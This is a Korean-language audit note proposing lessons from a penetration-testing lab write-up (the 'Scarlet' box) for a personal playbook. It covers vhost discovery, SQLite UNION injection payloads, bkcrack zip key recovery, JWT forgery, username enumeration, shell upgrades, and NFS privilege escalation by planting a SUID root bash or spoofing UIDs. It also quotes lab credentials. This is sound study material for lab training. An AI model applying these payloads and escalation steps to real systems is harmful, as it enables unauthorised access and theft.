---
tags:
  - type/audit
  - platform/pg
manual_tags: true
---
# Scarlet — `_PLAYBOOK` 이관 제안

원 노트 `03. PG\Scarlet.md` 1812행 → 1111행 개작(2026-08-26) 과정에서 노트 본문에서 **잘라낸** 학습 자료.
백업 원본은 `03. PG\_backup\Scarlet.md.bak`.

제안마다 ①어느 절 ②병합/신규 ③넣을 본문 ④지우기 전 원문 인용.
⚠️ **신규 항목은 번호를 비워 두었다.** 단독 기록자가 충돌을 보고 배정할 것.

---

## A-1. 「루트 응답이 66바이트고 브루트가 2건뿐이다」 → vhost

**① 절:** `A-16. 워드리스트 열거가 전부 공전한다`
**② 병합**
**③ 넣을 본문**

> **응답이 «비정상적으로 작으면» 워드리스트가 아니라 `Host:` 헤더 문제임.** [[Scarlet]] — `http://192.168.248.222/` 에 raft-medium + `-x php,txt,html,bak,zip` + 재귀 4단계를 걸어 **3분에 18만 요청**을 쐈고 나온 것은 **66바이트 `index.html` 한 장**뿐이었음(`found:2`). 같은 워드리스트·같은 옵션인데 `/etc/hosts` 에 `192.168.248.222 scarlet.local` 을 박고 `http://scarlet.local/` 로 다시 치니 **45건**이 나옴.
>
> 판별 신호 셋이 동시에 떴음 — ① 응답이 66바이트로 비정상적으로 작음 ② 디렉터리 버스팅이 0건에 수렴 ③ nmap 이 `http-title` 을 못 뽑음(`Site doesn't have a title`). nginx 가 IP 로 들어온 요청을 기본 서버 블록으로 보내고 `Host:` 가 맞아야 진짜 앱을 주는 구조였음(사후 확인 — 백업 안의 nginx 설정 `web/default` 는 `server_name _;` + `root /var/www/html`, `web/scarlet.local` 은 `server_name scarlet.local;` + `proxy_pass http://127.0.0.1:3000`).
>
> **문제는 3분이라는 시간이 아니라 판단 순서임.** 요청 하나면 끝날 판정을 스캐너에 맡겼음:
> ```bash
> curl -s -i http://192.168.248.222/ | head -20     # 3초. 66바이트인 걸 즉시 안다
> ```
> 순서는 ① `curl -si http://TARGET/` 로 상태코드·크기·서버 헤더·본문 → ② 본문이 수십~수백 바이트면 vhost 를 의심하고 호스트명부터 → ③ 그 다음에 버스팅. 호스트명 후보는 박스 이름 + `.local`/`.htb`/`.com`, TLS 인증서 CN·SAN, 리다이렉트 `Location`, 페이지 본문에서 나옴. 자동화는 `ffuf -u http://IP/ -H "Host: FUZZ.<도메인>" -w subdomains.txt -fs 66` 처럼 **기본 페이지 크기를 필터링**.
>
> ⚠️ [[Scarlet]] 은 `scarlet.local` 을 어떻게 특정했는지 기록이 없음 `[가정]` — `~/.zsh_history` 에 `sudo vi /etc/hosts` 만 남고 도메인을 캐낸 명령이 없어 **박스 이름 + `.local` 관례로 찍은 것**으로 봄. 그 66바이트를 `cat -A` 로 눈으로 확인하고 넘어갔다면 이 공백이 안 생겼음.

**④ 지우기 전 원문**

```text
### ① IP로 디렉터리 버스팅 3분 — 그리고 결과는 2건

가장 큰 시간 손실이다. `http://192.168.248.222/`에 raft-medium + 확장자 5종 + 재귀 4단계를 걸어 3분에 18만 요청을 쐈고, 나온 것은 **66바이트 index.html 하나**였다.

문제는 시간이 아니라 **판단 순서**다. 요청 몇 개면 끝날 판정을 스캐너에 맡겼다:

```bash
curl -s -i http://192.168.248.222/ | head -20     # 3초. 66바이트인 걸 즉시 안다
```

> [!danger] 버스팅을 시작하기 전에 루트 페이지를 눈으로 봐라
> 순서는 이렇다:
> 1. `curl -si http://TARGET/` — 상태코드·크기·서버 헤더·본문
> 2. **본문이 비정상적으로 작으면(수십~수백 바이트) vhost를 의심**하고 호스트명부터 찾는다
> 3. 그 다음에 버스팅
>
> 이 순서면 3분이 아니라 30초다. **디렉터리 버스팅은 "볼 게 있는 사이트"에 거는 도구**다.

> [!danger] 66c / 1줄 1단어 = 가상호스트(vhost) 신호다
> 정상 사이트가 66바이트일 수 없다. nginx가 IP로 들어온 요청은 기본 서버 블록(빈 페이지) 으로 보내고, **`Host:` 헤더가 맞아야 진짜 앱**을 준다는 뜻이다.
> 판별 기준 셋: ① 응답이 비정상적으로 작다 ② 디렉터리 버스팅이 0건에 수렴한다 ③ nmap이 `http-title` 을 못 뽑는다(`Site doesn't have a title`).
> 대응: **`/etc/hosts`에 호스트명을 박고 다시 친다.** 호스트명 후보는 nmap TLS 인증서 CN·SAN, 페이지 본문, 리다이렉트 `Location`, 박스 이름 자체(`scarlet.local`)에서 나온다.
> 자동화하려면 `ffuf -u http://IP/ -H "Host: FUZZ.<도메인>" -w subdomains.txt -fs 66` 처럼 기본 페이지 크기(66)를 필터링한다.

`[가정]` 원문에 `scarlet.local`을 어떻게 알아냈는지는 기록돼 있지 않다. 박스 이름 + `.local` 관례로 찍었거나 66바이트 index.html 본문에 링크가 있었을 것이다. **시험이라면 `curl -s http://IP/ | cat -A`로 그 66바이트를 반드시 눈으로 확인하고 넘어가라** — 이 노트의 가장 큰 기록 공백이다.

> [!warning] 스캐너 함정 — `errors:380474`를 무시하지 마라
> 오류 38만 건은 "스캔이 끝났다"가 아니라 **"상당수 경로를 확인 못 했다"** 는 뜻이다. Node 단일 프로세스 앱에 `-t 100`은 과하다.
> 시험에서는 `-t 20~30`으로 낮추고, 오류가 많으면 핵심 경로만 골라 재확인한다. 여기서는 `/views/`·`/routes/` 아래를 다시 훑을 가치가 있었다.
```
(마지막 `errors:` 콜아웃의 판정 문장은 노트 본문 표에 남겼음 — 「스캔 완료가 아니라 상당수 미확인」. `-t 20~30` 권고만 이관 대상.)

---

## A-2. 「SQLi 는 되는데 어떤 값은 나오고 어떤 값은 빈 줄이다」 — 인젝션 실패가 아니라 추출 실패

**① 절:** `A-2-17. SQLi 는 찾았는데 데이터가 안 나온다`
**② 병합**
**③ 넣을 본문**

> **같은 테이블에서 어떤 컬럼은 나오고 어떤 컬럼은 빈 줄이면 «추출 파이프라인»을 의심할 것 — 페이로드가 아니다.** [[Scarlet]] — `sqlite_master` 를 조회하는데 `name` 은 나오고 `sql` 은 빈 결과였음:
> ```text
> === [1] 전체 스키마 (모든 테이블 CREATE 문) ===
>                           ← 빈 줄
> === [2] 테이블 이름 목록 ===
> users sqlite_sequence     ← 이건 됐다
> ```
> **원인 `[가정]`:** 추출 정규식이 `grep -oP '(?<=<strong>Hey ).*?(?=, <br>)'` 였음. `grep` 은 줄 단위로 동작하고 `.` 은 개행에 매치되지 않는데, `CREATE TABLE` 문은 여러 줄에 걸쳐 있어 **`<strong>Hey` 와 `, <br>` 두 앵커가 한 줄 안에서 함께 매치되지 않음.**
>
> **판별법: 길이가 짧고 개행이 없는 값으로 먼저 시험할 것.** `UNION SELECT 'AAA',2,3` 이 화면에 `AAA` 로 나오면 추출 파이프라인은 정상이고, 그 다음이 데이터 형태 문제다. [[Scarlet]] 은 `[2]` 의 테이블 이름(개행 없음)이 나온 시점에 「파이프라인은 멀쩡하고 데이터 형태가 문제」라고 판정할 수 있었음.
>
> 해결책 셋:
> ```bash
> # ① 개행을 SQL 안에서 제거한다  ← 가장 확실
> inject "zzz' UNION SELECT group_concat(replace(replace(sql,char(10),' '),char(13),' '),' ||| '),2,3 FROM sqlite_master WHERE type='table'-- -"
>
> # ② 줄바꿈을 무시하고 추출한다 (tr로 개행 제거 후 grep)
> curl -s "$URL" -H "Cookie: session=$token" | tr '\n' ' ' | grep -oP '(?<=<strong>Hey ).*?(?=, <br>)'
>
> # ③ 애초에 hex로 뽑아 개행 문제를 없앤다
> inject "zzz' UNION SELECT group_concat(hex(sql),' '),2,3 FROM sqlite_master WHERE type='table'-- -"
> ```
> **이 실패를 구한 것은 미리 짜 둔 폴백이었음** — 스크립트가 `users`·`user`·`accounts`·`members`·`authors`·`admin` × 흔한 컬럼 조합 5종을 순회한 덕에 스키마 없이도 답이 나왔다(`brian:Standingbytheseaside12  4leaf:password1`). **자동 폴백을 미리 짜 두는 것이 시험에서 유효한 이유.**

**④ 지우기 전 원문** — 옛 노트 `6장 ⑥` 전문(`_backup\Scarlet.md.bak` 1550~1592행). 위 본문이 그 전량이고, `CREATE TABLE users (...)` 예시 블록(「이 박스에서 발생한 출력이 아니다 — 전형적인 형태」 주석 포함)만 지면상 생략했다.

---

## A-3. 「암호 걸린 zip 인데 사전공격이 안 먹는다」 — 목록부터 보면 사전공격 자체가 불필요할 수 있다

**① 절:** `A. 증상별` — **신규**(A-2 계열: 진입/권한상승 공통. 배정은 기록자 판단)
**② 신규**
**③ 넣을 본문**

> **암호 걸린 아카이브를 만나면 «크랙»보다 «목록»이 먼저다. 목록은 암호 없이 읽힌다** — 중앙 디렉터리가 암호화되지 않기 때문.
> ```bash
> unzip -l backup.zip ; unzip -v backup.zip     # 목록 + 압축 방식 + 암호화 표시(*)
> 7z l -slt backup.zip | grep -E 'Path|Method'  # ZipCrypto 인가 AES 인가
> ```
> 판단 분기 — **AES-256** → known-plaintext 불가, `zip2john` + `john`/`hashcat -m 13600` 사전공격만 남음. **ZipCrypto + 내용물 중 하나를 알거나 구할 수 있음** → bkcrack(수 초). **ZipCrypto + 아무것도 모름** → 사전공격, 또는 아카이브 안에 `bootstrap.min.css`·`jquery.min.js` 처럼 인터넷에서 동일 바이트를 구할 수 있는 파일이 있는지 본다.
>
> [[Scarlet]] 실측 — `/opt/backup.zip`(3.5MB, ZipCrypto)에 **사전·추측 공격을 먼저 태웠고 전부 실패**했음. mtime 으로 복원한 순서(`~/PG/Scarlet/` · `~/.zsh_history` 2386~2396):
>
> | 시각(KST) | 시도 | 결과 |
> |---|---|---|
> | 16:23:09 | `scp brian@…:/opt/backup.zip .` | — |
> | 16:23:37 | `zip2john backup.zip > zip.hash` → `john zip.hash --wordlist=rockyou.txt` | 실패 |
> | 16:24:33 | `for pw in Standingbytheseaside12 password1 scarlet Scarlet Scarlet123 4leaf brian; do 7z x -p"$pw" backup.zip -oex_test -y …` | 7종 전부 실패 |
> | 16:24:39 | `for pw in …; do python3 -c "zipfile.ZipFile('backup.zip').extractall('ex',pwd=b'$pw')" …` | 6종 전부 실패 |
> | (그 사이) | `john zip.hash --wordlist=rockyou.txt --rules=Jumbo` | 실패 |
> | 16:27:26 | bkcrack clone + cmake 빌드 | — |
> | 16:32:19 | `deflate.py < public.key > pub.deflate` | — |
> | 16:32:24→29 | `bkcrack -C … -c web/public.key -p pub.deflate` | **5초, 키 복구** |
>
> 즉 「5초」라는 결과 앞에 **약 10분의 헛수고**가 있었고, `unzip -l` 한 줄이 그 전부를 없앨 수 있었음 — 목록 안에 `web/public.key` 가 있었고 그 파일은 **NFS 에서 이미 확보한 것과 동일**했기 때문이다.
>
> ⚠️ **비밀번호 재사용 추측(`7z x -p` · `zipfile.extractall(pwd=)`)도 하나의 시도로 세라.** 실패해도 흔적이 남는다 — [[Scarlet]] 의 `~/PG/Scarlet/ex_test/` 는 `7z` 가 잘못된 암호로 만든 **0바이트 파일 트리**이고 `ex/` 는 파이썬이 첫 엔트리에서 죽어 남은 빈 디렉터리다. **지우지 말 것. 「무엇을 이미 배제했는가」의 유일한 기록이다**(A-69).
>
> ⚠️ **`rockyou` 로 안 풀렸다는 사실 자체는 정보가 아님.** [[Scarlet]] 의 zip 암호는 끝내 알아내지 못했고 알 필요도 없었다 — bkcrack 이 복구하는 것은 비밀번호가 아니라 내부 키 3개이기 때문이다.

**④ 지우기 전 원문**

```text
### ⑪ `zip2john` + `john` 사전공격을 먼저 태웠다가 실패하고 bkcrack로 전환했다

원문 터미널에는 안 나오지만 Kali에 흔적이 남아 있다 — 작업 디렉터리에 `zip.hash`가 그대로 있고, `~/.zsh_history` 2386~2455행이 `zip2john backup.zip > zip.hash` → `john --wordlist=rockyou.txt` → 실패 → Jumbo 룰까지 적용 → 실패 → 포기 순서를 기록한다.

즉 4-3절의 "5초"라는 결과 앞에는 **사전공격에 태운 시간이 먼저 있었다.**

> [!tip] 판단 분기를 앞으로 당겨라 — 목록을 먼저 본다
> `unzip -l`로 아카이브 안에 내가 이미 가진 파일(`web/public.key`)이 있다는 것을 확인한 시점에, 사전공격은 **시도할 이유가 사라진다.** 순서는 이렇다:
> ```bash
> unzip -l backup.zip            # ① 목록 — 암호 없이 읽힌다. 내가 아는 파일이 있는가?
> 7z l -slt backup.zip           # ② Method 가 ZipCrypto 인가 AES 인가
> #   ZipCrypto + 아는 파일 있음  →  bkcrack (수 초)
> #   그 외                      →  그때 비로소 zip2john + john/hashcat
> ```
> **`rockyou`로 안 풀렸다는 사실 자체는 정보가 아니다.** 이 박스의 zip 암호는 끝내 알아내지 못했고, 알 필요도 없었다 — bkcrack가 복구하는 것은 비밀번호가 아니라 내부 키 3개이기 때문이다(2-5절).
> 이것이 frontmatter 태그를 `tech/cred/crack`에서 `tech/crypto/known-plaintext`로 바꾼 이유다. 이 박스는 비밀번호를 크랙한 박스가 아니다 — **비밀번호를 우회한 박스**다.

(9장·시험관점 9번)
9. **암호 걸린 아카이브는 목록부터 본다.** 목록은 암호 없이 읽힌다.
   ```bash
   unzip -l backup.zip ; unzip -v backup.zip     # 목록 + 압축 방식 + 암호화 표시(*)
   7z l -slt backup.zip | grep -E 'Path|Method'  # ZipCrypto 인가 AES 인가
   ```
   **판단 분기:** AES-256 → `zip2john` + `hashcat -m 13600` 사전공격만. ZipCrypto + 내용물 중 하나를 안다 → bkcrack (수 초). ZipCrypto + 모름 → 아카이브 안에 `bootstrap.min.css`·`jquery.min.js` 같은 인터넷에서 동일 바이트를 구할 수 있는 파일이 있는지 본다.

(남긴 흔적 표에서)
| `zip.hash`(zip2john 산출물, 미해독) · `pub.deflate` · `decrypted.zip` · `out/`(칼리 측) | 남아 있음 — `zip.hash`는 사전공격이 실패한 흔적이다(6장 ⑪) |
```
⚠️ **7z·python 비번 추측 두 루프는 옛 노트에 «없었다».** 이번 개작에서 `~/.zsh_history` 2389~2394 와 `ex`·`ex_test` 디렉터리의 0바이트 파일 트리로 새로 발굴했다.

---

## A-4. 「토큰 위조는 성공했는데 권한이 안 오른다」

**① 절:** `A. 증상별` — **신규**(A-2 계열)
**② 신규**
**③ 넣을 본문**

> **「위조에 성공했다」와 「권한을 얻었다」는 다르다.** 토큰 위조는 인증(authentication)을 우회하지만, 그 다음에 애플리케이션이 DB 를 조회하면 **존재하지 않는 사용자는 아무것도 얻지 못한다.**
>
> [[Scarlet]] — JWT 키 혼동으로 `{"username":"admin"}` 토큰을 만들었고 서버가 서명을 받아들였으나 **`admin` 계정이 DB 에 없었다.** `admin`·`administrator`·`root` 는 커스텀 웹앱에서 의외로 존재하지 않는 경우가 많다(실명 계정만 쓰기 때문).
>
> 대응 순서 — ① 실제 사용자명을 먼저 확보(웹사이트 본문·`/robots.txt`·커밋 로그·이메일 주소·푸터) ② 존재/부재를 구분하는 응답 차이를 오라클로 삼는다 ③ 그 오라클로 후보를 순회. **친절한 에러 메시지가 곧 열거 취약점이다** — [[Scarlet]] 은 `user <name> doesn't exist in our database.` 가 그대로 오라클이 됐고, 이름 변형 12개 중 **가장 단순한 `brian`** 하나만 존재했다.
>
> 사용자명 변형은 기계적으로 만들 것. `First Last` 에서 최소 8가지 — `first`·`last`·`first.last`·`firstlast`·`flast`·`f.last`·`first_last`·`firstl`. 자동화는 `username-anarchy -i names.txt` 또는
> ```bash
> awk '{f=tolower($1);l=tolower($2); print f; print l; print f"."l; print f l; print substr(f,1,1) l; print substr(f,1,1)"."l; print f"_"l; print f substr(l,1,1)}' names.txt | sort -u
> ```
>
> **그리고 유효한 사용자로 들어가도 아무것도 없을 수 있다.** [[Scarlet]] 은 `brian` 토큰으로 포털을 열었으나 관리 메뉴도 추가 정보도 없었음(원문 기록 한 줄: 「brian 아이디로 접근시 변동사항 없음」). 여기서 나온 판단이 박스를 풀었다:
>
> **권한이 안 오르면 그 파라미터를 「출력 채널」로 다시 볼 것.** 「이 값이 누구인가를 결정한다」에서 **「이 값이 어떤 쿼리를 만드는가」**로 사고를 전환. 다음 수가 `brian'` 한 글자였고 그것이 `Error: SQLITE_ERROR: unrecognized token: "'brian''"` 를 뱉었다.
> → **값이 DB 조회에 쓰이는 것이 확실한 파라미터는, 권한 조작이 막히면 반드시 인젝션을 시험한다.** 순서는 ① 값 조작(권한) → ② 문법 파괴(인젝션). 대부분 ②를 잊는다.

**④ 지우기 전 원문** — 옛 노트 `6장 ④`·`⑤` 전문 + `3-5절`의 사용자명 변형 팁(`_backup\Scarlet.md.bak` 857~863 · 1519~1548행). 위 본문이 그 전량이다.

---

## A-5. 「명령이 빈 출력만 뱉는다」 — `2>/dev/null` 이 진단을 지웠다

**① 절:** `A. 증상별` — **신규**(A-6 판단·검증 계열)
**② 신규**
**③ 넣을 본문**

> **결과가 비면 `2>/dev/null` 을 떼고 다시 칠 것.** 노이즈를 줄이려고 붙인 리다이렉션이 **「왜 실패했는지」까지 버린다.** 3초짜리 습관인데 놓치면 몇 분을 태운다.
>
> [[Scarlet]] — NFS 에서 얻은 PEM 공개키를 OpenSSH 형식으로 바꾸려다 빈 출력을 받았다:
> ```bash
> └─$ ssh-keygen -f public.key -e -m PKCS8 2>/dev/null | head
>               ← 아무것도 안 나온다
> ```
> **원인은 방향이 반대였던 것.** `ssh-keygen -e` 는 OpenSSH 형식 키를 **다른 형식으로 내보내는(export)** 명령인데 입력이 이미 PKCS#8 PEM(`-----BEGIN PUBLIC KEY-----`)이라 파싱에 실패했고, `2>/dev/null` 이 에러 메시지까지 삼켰다. 필요했던 것은 **PEM → OpenSSH(import)** 다:
> ```bash
> ssh-keygen -i -m PKCS8 -f public.key      # -i = import.  ssh-rsa AAAAB3... 를 얻는다
> ```
>
> | 옵션 | 방향 | 용도 |
> |---|---|---|
> | `-i -m PKCS8` | PEM/PKCS8 → OpenSSH | `authorized_keys` 에 넣을 형태로 |
> | `-e -m PKCS8` | OpenSSH → PEM/PKCS8 | openssl 로 다루려고 |
> | `-e -m PEM` | OpenSSH → 전통 PEM | 구형 도구 호환 |
> | `-y -f <개인키>` | 개인키 → 공개키 | 키 쌍 대조 |
>
> **다만 이 실패는 결과에 영향이 없었다** — `openssl rsa -pubin` 으로 이미 키 유효성이 확인됐고, JWT 키 혼동에 필요한 것은 **PEM 파일 원본 바이트 그대로**였다. 형식 변환은 애초에 불필요한 우회였음. → **「변환부터 하고 보는」 반사를 경계할 것.** 그 키를 무엇에 쓸지부터 정하면 변환이 필요 없는 경우가 많다.

**④ 지우기 전 원문** — 옛 노트 `6장 ②` 전문(`_backup\Scarlet.md.bak` 1474~1500행). 위 본문이 그 전량이다.

---

## A-6. 「한 번에 두 변수를 바꿔 성공했다」 — 원인을 모른 채 진도만 나갔다

**① 절:** `A-61. 관측은 맞는데 결론이 어긋난다` **또는 신규**
**② 판단 필요 — 기록자가 병합/신규 결정.** A-61 은 「관측↔결론」 분리이고 이 항목은 「변수 분리」라 결이 조금 다름
**③ 넣을 본문**

> **한 번에 한 변수만 바꿀 것.** 두 개를 동시에 바꾸고 성공하면 **원인을 모른 채 진도만 나가고**, 다음에 같은 상황을 만나면 또 헤맨다.
>
> [[Scarlet]] — 첫 로그인 시도가 `Content-Type: application/json` + `admin:admin`, 두 번째가 `application/x-www-form-urlencoded` + `4leaf:password1` 이었고 두 번째가 성공했다. 원문 기록만으로는 **자격증명이 틀렸던 건지 Content-Type 이 안 맞았던 건지 알 수 없었다.**
>
> **사후에 복호화한 소스가 「둘 다」로 확정했다** — `web/index.js` 가 `app.use(bodyParser.urlencoded({ extended: false }))` 만 등록하고 **`bodyParser.json()` 을 붙이지 않았다.** JSON 본문은 파싱되지 않아 `req.body.username` 이 `undefined` 가 되므로 자격증명이 맞아도 실패한다.
>
> 로그인 폼을 만나면 먼저 실제 요청을 관찰해 **Content-Type 과 필드명을 확정하고, 자격증명만 변수로 남길 것**:
> ```bash
> curl -s http://TARGET/login | grep -iE '<form|<input'   # 폼의 enctype과 필드명
> ```

**④ 지우기 전 원문**

```text
### ③ JSON 로그인이 실패 — 두 변수를 동시에 바꿨다

첫 시도는 `Content-Type: application/json` + `admin:admin`, 두 번째는 `application/x-www-form-urlencoded` + `4leaf:password1`. 두 번째가 성공했다.

**하지만 무엇이 원인인지 이 기록으로는 알 수 없다.** 자격증명이 틀렸던 건가, Content-Type이 안 맞았던 건가?

**둘 다일 가능성이 높다.** Express 앱이 `express.urlencoded()`만 등록하고 `express.json()`을 안 붙였으면, JSON 본문은 파싱되지 않아 `req.body.username`이 `undefined`가 된다 — 자격증명이 맞아도 실패한다. `[가정]` 복호화한 `out/web/index.js`를 열면 확정할 수 있었다.

> [!danger] 한 번에 한 변수만 바꿔라
> 두 개를 동시에 바꾸고 성공하면 **원인을 모른 채 진도만 나간다.** 다음에 같은 상황을 만나면 또 헤맨다.
> 로그인 폼을 만나면 먼저 브라우저나 프록시로 실제 요청을 관찰한다:
> ```bash
> # 폼의 enctype과 필드명을 확인
> curl -s http://scarlet.local/login | grep -iE '<form|<input'
> ```
> 그러면 Content-Type과 필드명이 확정되고, **자격증명만 변수로 남는다.**
```
✅ **이번 개작에서 `[가정]` 이 해소됐다** — `out/web/index.js` 를 실제로 열어 `bodyParser.json()` 부재를 확인했다.

---

## A-7. 로그인 셸이 `/bin/sh` 면 즉시 bash 로 올린다

**① 절:** `A-3. 셸` — **신규**(작은 항목. 기존 셸 안정화 카드에 흡수해도 됨)
**② 신규 또는 흡수 — 기록자 판단**
**③ 넣을 본문**

> **SSH 로그인은 이미 PTY 를 갖고 있다 — `python3 -c 'import pty…'` 가 필요 없다.** 문제는 **로그인 셸이 `/bin/sh` 인 것**이고, 증상은 프롬프트가 `$` 뿐이며 탭 완성·히스토리가 없는 것이다.
> ```bash
> /bin/bash -i                          # 가장 짧다
> exec /bin/bash --login                # 프로필까지 읽고 싶으면
> ssh user@TARGET -t "/bin/bash -i"     # 접속과 동시에
> ```
> [[Scarlet]] — `brian` 으로 SSH 후 곧바로 `cat lo` 오타(`cat: lo: No such file or directory`)를 냈다. 탭 완성이 없어서다. **셸을 잡으면 즉시 bash 로 올리는 습관**이 이런 잔실수를 없앤다.
> 리버스셸에서 올라온 경우는 순서가 다르다 — `python3 -c 'import pty; pty.spawn("/bin/bash")'` → `^Z` → `stty raw -echo; fg; export TERM=xterm; stty rows 50 cols 200`. `python3` 가 없으면 `script -qc /bin/bash /dev/null`.

**④ 지우기 전 원문** — 옛 노트 `3-8절` 콜아웃 + `6장 ⑦`(`_backup\Scarlet.md.bak` 1016~1028 · 1594~1601행).

---

## C-1. 셸 직후 `id ; sudo -l` 을 빠뜨렸다

**① 절:** `C-2. 셸 직후`
**② 병합**
**③ 넣을 본문**

> ⚠️ **`sudo -l` 은 가장 싸고 가장 자주 답을 주는 명령인데 빠뜨리기 쉽다.** [[Scarlet]] 은 `/etc/exports`·SUID·capability·crontab 을 전부 쳤는데 **`id` 와 `sudo -l` 기록이 없다.** 결과적으로 다른 경로(`/opt/backup.zip`)가 있었지만 순서상 첫 번째로 쳤어야 하는 명령이다.
> **비밀번호를 알고 SSH 로 들어온 경우 `sudo -l` 은 반드시 친다** — 프롬프트가 뜨면 이미 아는 비밀번호를 넣어본다.
>
> 그리고 **`/opt`·`/srv`·`/var/backups`·`/var/www`·`/home/*` 를 «같은 라운드에서» 볼 것.** SUID·크론·capability 를 다 훑고 «나서» 보는 것이 아니다 — [[Scarlet]] 의 정답은 `ls -la /opt` 한 줄에 있었고(`-rw-r--r-- 1 brian brian 3557636 Jul 17 2022 backup.zip`), 앞의 세 열거는 전부 배포판 기본값이라 공회전이었다.
> ```bash
> id ; sudo -l
> find / -perm -4000 -type f 2>/dev/null | grep -v snap
> getcap -r / 2>/dev/null
> cat /etc/crontab ; ls -la /etc/cron.* /var/spool/cron/crontabs 2>/dev/null
> ps aux --forest | grep -v '\[' ; ss -lntup
> ls -la /opt /srv /var/backups /var/www /home/*
> ```

**④ 지우기 전 원문** — 옛 노트 `4-1절` 콜아웃 + `6장 ⑧` + `7장 12번`(`_backup\Scarlet.md.bak` 1133~1142 · 1603~1613 · 1725~1733행).

---

## D-1. 손절 지점 — Scarlet 시간 배분

**① 절:** `D. 시간 배분 · 손절 기준`
**② 병합**
**③ 넣을 본문**

> **[[Scarlet]] (Intermediate · Linux) — 구간별 실측과 판단**
>
> | 구간 | 실제 | 판단 |
> |---|---|---|
> | nmap 전수 스캔(`-p- -sCV -A --min-rate 5000`) | 27.5초 | 적절 |
> | IP 대상 feroxbuster | 3분 | **손절 지점.** 30초 만에 66바이트를 확인하고 중단했어야 함(A-16) |
> | vhost 발견 후 재스캔 | 6분 | 길지만 앱 구조 파악에 필요. `-t 30` 으로 낮췄으면 `errors:380474` 도 줄었을 것 |
> | NFS 마운트 → 공개키 확보 | 1분 미만 | 투자 대비 최고 효율. **이걸 먼저 했어야 함** |
> | JWT 키 혼동 확인 · 사용자 열거 | 수 분 | 적절 |
> | SQLi 스키마 추출 실패 | 불명 | 폴백이 있어 손실 최소 |
> | `zip2john` + `john` + 비번 추측 7종·6종 | 약 10분(16:23:09→16:32:19, mtime) | **손절 지점.** `unzip -l` 로 목록을 먼저 봤다면 시도할 이유 자체가 없었음 |
> | bkcrack | 5초 | 재료가 갖춰지면 즉시 |
>
> **최적 순서 — 정찰 단계에서 NFS 와 웹을 병렬로 굴린다.**
> ```
> nmap -p-  →  showmount -e  →  NFS 마운트 (여기까지 2분)
>            ↘  curl -si http://IP/  →  66바이트 확인 → vhost 추정 (30초)
> ```
> NFS 는 답이 빠르고, 웹은 vhost 판정만 먼저 끝낸 뒤 본격 버스팅은 호스트명을 붙이고 한 번만 돈다.
> **한 서비스에 20분을 넘기면 다른 서비스로 옮길 것.** 옮긴 곳에서 얻은 정보가 원래 서비스를 열어주는 경우가 이 박스처럼 흔하다 — NFS 공개키 한 장이 웹의 JWT 를 열었다.

**④ 지우기 전 원문** — 옛 노트 `6장 ⑨` 전문(`_backup\Scarlet.md.bak` 1615~1635행). 표의 `zip2john` 행 「불명(히스토리에만 남음)」을 **mtime 실측 약 10분**으로 교체했다.

---

## B-1. NFS(111 · 2049) — `no_root_squash` 가 아니어도 버리지 마라

**① 절:** `B-2. 네트워크 서비스` — **신규**
**② 신규**
**③ 넣을 본문**

> **111 + 2049 가 같이 보이면 웹보다 먼저 밟는다.** 셸이 없어도 파일을 읽을 수 있는 서비스(NFS·SMB·FTP·TFTP·rsync)는 우선순위가 다르다. 비용이 30초다.
> ```bash
> showmount -e <IP>                      # export 목록
> showmount -a <IP>                      # 현재 마운트 중인 클라이언트 (정보 유출)
> showmount -d <IP>                      # 마운트된 디렉터리
> mkdir -p /tmp/nfs
> sudo mount -t nfs <IP>:/<export> /tmp/nfs -o nolock
> ls -lan /tmp/nfs                       # -n 이 핵심: 이름 대신 숫자 UID/GID를 본다
> ```
> `showmount` 가 비면 **NFSv4 전용**을 의심하고 `sudo mount -t nfs4 <IP>:/ /tmp/nfs` 로 의사 루트를 마운트한다. `rpcinfo -p <IP>` 의 `100003` 줄에 v3 이 있는지로 미리 판정할 수 있다.
>
> **마운트 옵션** — `-o nolock` 은 사실상 필수다. NLM(파일 잠금)은 별도 포트를 쓰고 **클라이언트로 되돌아오는 콜백 연결**을 요구하므로, VPN·방화벽 환경에서 빼면 마운트가 수십 초 멈췄다가 실패한다. `-o vers=3` 은 v4 협상이 실패할 때, `-o ro` 는 원본 보존이 필요할 때.
>
> **`root_squash` / `no_root_squash`** — 서버는 클라이언트의 자기 신고 UID 를 그대로 쓰되 UID 0 만 `nobody`(65534)로 강등한다. 그것이 `root_squash` 이고 **기본값**이다. `no_root_squash` 면 클라이언트 root 가 서버 root 가 되어 고전 권한상승이 성립한다:
> ```bash
> sudo mount -t nfs <IP>:/export /tmp/nfs
> sudo cp /bin/bash /tmp/nfs/bash        # 서버에 root 소유로 기록된다
> sudo chown root:root /tmp/nfs/bash
> sudo chmod u+s /tmp/nfs/bash           # SUID root 비트를 서버 파일시스템에 심는다
> # 타겟에서 셸을 잡은 뒤:  /export/bash -p   → uid=0
> ```
>
> ⚠️ **`ls` 출력의 `nobody nogroup` 은 `root_squash` 의 증거가 아니다.** `root_squash` 는 **요청 UID 를 강등하는 접근 통제**이지 파일의 표시 소유자를 바꾸는 기능이 아니다. [[Scarlet]] 에서 `/tmp/nfs` 는 `drwxrwxrwx nobody nogroup` 인데 **바로 아랫줄 `essentials` 는 `root root`** 로 보였다 — 같은 마운트에서 부모만 뒤집힐 이유가 없으므로 그것은 서버측 실제 소유권이다. 판정의 확실한 근거는 `/etc/exports` 뿐이고, 셸 전에 실증하려면 직접 써 본다:
> ```bash
> sudo touch /tmp/nfs/probe && ls -lan /tmp/nfs/probe
> #  UID 0 으로 기록되면      → no_root_squash
> #  UID 65534(nobody) 이면   → root_squash
> ```
>
> **`Permission denied` 가 뜨면 UID 를 맞춘다.**
> ```bash
> ls -lan /tmp/nfs                       # 파일의 실제 UID를 숫자로 확인 (-n 이 핵심)
> sudo useradd -u 1001 nfsvictim         # 같은 UID의 로컬 사용자를 만들고
> sudo -u nfsvictim cat /tmp/nfs/id_rsa  # 그 사용자로 접근
> ```
> `id_rsa` 가 놓인 export 는 거의 항상 `0600` 이므로 이 절차는 손에 익혀야 한다.
>
> ⛔ **`no_root_squash` 가 아니라고 NFS 를 버리지 마라.** export «안에 무엇이 들어 있는지»가 본질이다 — 키·설정파일·백업·DB 파일 하나면 체인이 열린다. [[Scarlet]] 의 export 는 `/mnt/share *(rw,sync,no_subtree_check)` 로 `no_root_squash` 가 **없었고**, 그 안의 `essentials/public.key` 한 장이 JWT 위조와 zip 복호화 두 단계를 전부 열었다. 찾을 것: `id_rsa`·`.ssh/`·`*.key`·`*.pem`·`.env`·`config.php`·`*.db`·`*.zip`·`.bash_history`·`shadow`.
>
